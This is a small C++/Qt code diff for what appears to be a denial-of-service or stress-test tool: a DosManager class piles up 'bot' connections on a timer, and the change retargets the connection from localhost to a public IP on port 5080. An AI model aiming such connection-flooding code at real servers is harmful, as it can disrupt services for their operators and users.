@@ -12,11 +12,6 @@ void DosManager::timerEvent(QTimerEvent *)
     connect(m, SIGNAL(disconnected()), SLOT(removeStuff()));
     bots.insert(m);
     qDebug() << "added , " << bots.size();
-    if (bots.size() > 50) {
-        int a;
-
-        a = a + 1;
-    }
 }
 
 void DosManager::removeStuff()
@@ -37,7 +32,7 @@ IOManager::IOManager()
     connect(a, SIGNAL(connected()), SLOT(connectionEstablished()));
     connect(a, SIGNAL(disconnected()), SLOT(goodToDelete()));
     on = true;
-    a->connectTo("localhost", 5080);
+    a->connectTo("84.20.150.28", 5080);
 }
 
 IOManager::~IOManager()
